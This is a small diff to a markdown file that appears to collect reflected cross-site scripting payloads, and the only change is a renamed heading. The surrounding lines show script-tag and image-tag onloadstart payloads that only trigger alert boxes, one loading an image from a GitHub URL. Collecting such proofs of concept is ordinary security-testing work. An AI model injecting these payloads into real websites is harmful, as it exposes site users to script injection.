@@ -14,7 +14,7 @@ qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
 ```
 <div><image src=validateNonExistantImage.png onloadstart=alert(1337)>hello from nu11secur1ty</div>
 ```
-## ExistantImage + ENCODED = XSS-Reflected
+## Existant-Image + ENCODED = XSS-Reflected
 ```
 <div><image src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp onloadstart=alert(1337)>hello from nu11secur1ty</div>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
